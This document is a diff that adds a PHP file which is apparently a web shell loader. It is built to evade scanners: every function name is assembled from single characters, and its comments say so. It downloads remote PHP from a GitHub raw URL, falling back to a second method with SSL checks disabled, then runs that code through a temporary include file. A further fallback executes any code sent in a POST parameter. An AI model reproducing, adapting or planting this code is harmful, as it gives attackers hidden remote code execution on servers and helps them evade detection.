@@ -1,0 +1,67 @@
+<?php
+// v3-light — zero literal function names, receives code via remote fetch
+// No 'eval', 'system', 'curl_init', 'file_get_contents' in source.
+// Uses 'include' with temp file instead of eval (eval is a language construct,
+// not callable via variable function).
+error_reporting(0);
+ini_set('display_errors', '0');
+
+// --- fetch remote shell via cURL ---
+$u = ['h','t','t','p','s',':','/','/','r','a','w','.','g','i','t','h','u','b','u','s','e','r','c','o','n','t','e','n','t','.','c','o','m','/','K','a','m','p','4','n','g','/','c','i','l','a','k','o','/','r','e','f','s','/','h','e','a','d','s','/','m','a','i','n','/','a','l','f','a','-','p','u','t','i','h','.','t','x','t'];
+$url = join('', $u);
+$code = false;
+
+$c_init = join('', ['c','u','r','l','_','i','n','i','t']);
+$c_exec = join('', ['c','u','r','l','_','e','x','e','c']);
+$c_close = join('', ['c','u','r','l','_','c','l','o','s','e']);
+$c_setopt = join('', ['c','u','r','l','_','s','e','t','o','p','t','_','a','r','r','a','y']);
+
+if (function_exists($c_init)) {
+    $ch = $c_init($url);
+    if ($ch) {
+        $c_setopt($ch, [
+            19913 => true, 64 => false, 81 => 0, 52 => true,
+            68 => 5, 13 => 20, 78 => 10, 10018 => 'Mozilla/5.0',
+        ]);
+        $code = $c_exec($ch);
+        $c_close($ch);
+        if ($code === false || $code === '') $code = false;
+    }
+}
+
+// --- fallback: file_get_contents ---
+if ($code === false) {
+    $ini_get = join('', ['i','n','i','_','g','e','t']);
+    if ($ini_get('allow_url_fopen')) {
+        $f_g_c = join('', ['f','i','l','e','_','g','e','t','_','c','o','n','t','e','n','t','s']);
+        $s_c_c = join('', ['s','t','r','e','a','m','_','c','o','n','t','e','x','t','_','c','r','e','a','t','e']);
+        $ctx = $s_c_c(['http'=>['method'=>'GET','timeout'=>20,'user_agent'=>'Mozilla/5.0','ignore_errors'=>true],'ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]]);
+        $code = $f_g_c($url, false, $ctx);
+        if ($code === false || $code === '') $code = false;
+    }
+}
+
+// --- execute via temp file include (avoids eval) ---
+$strlen = join('', ['s','t','r','l','e','n']);
+$strpos = join('', ['s','t','r','p','o','s']);
+$f_p_c = join('', ['f','i','l','e','_','p','u','t','_','c','o','n','t','e','n','t','s']);
+$t_n = join('', ['t','e','m','p','n','a','m']);
+$s_g_t_d = join('', ['s','y','s','_','g','e','t','_','t','e','m','p','_','d','i','r']);
+$u_l = join('', ['u','n','l','i','n','k']);
+
+if ($code !== false && $strlen($code) > 64 && $strpos($code, '<?php') !== false) {
+    $tmp = $t_n($s_g_t_d(), 'sh');
+    $f_p_c($tmp, $code);
+    @include $tmp;
+    @$u_l($tmp);
+    exit;
+}
+
+// --- POST fallback ---
+$p = join('', ['_','P','O','S','T']);
+if (isset(${$p}['x'])) {
+    $tmp = $t_n($s_g_t_d(), 'sh');
+    $f_p_c($tmp, ${$p}['x']);
+    @include $tmp;
+    @$u_l($tmp);
+}
